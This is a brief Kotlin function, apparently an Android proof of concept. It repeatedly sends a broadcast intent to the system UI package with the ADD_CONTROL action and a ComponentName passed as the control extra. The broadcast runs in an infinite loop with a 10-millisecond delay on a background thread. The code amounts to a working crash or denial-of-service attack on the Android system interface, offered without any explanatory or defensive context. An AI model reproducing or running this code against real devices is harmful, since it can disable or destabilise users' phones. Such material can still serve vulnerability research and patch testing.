@RequiresApi(Build.VERSION_CODES.R)
    private fun test(activity: MainActivity){
        val intent = Intent()
        intent.setPackage("com.android.systemui")
        intent.action = "android.service.controls.action.ADD_CONTROL"
        val componentName = ComponentName("com.android.systemui","com.android.systemui.stackdivider.ForcedResizableInfoActivity")
        intent.putExtra("android.intent.extra.COMPONENT_NAME",componentName)
        intent.putExtra("android.service.controls.extra.CONTROL",componentName)
        Log.d("jmp0","asmjmp0")
        thread {
            while (true){
                activity.sendBroadcast(intent)
                Thread.sleep(10)
            }
        }
    }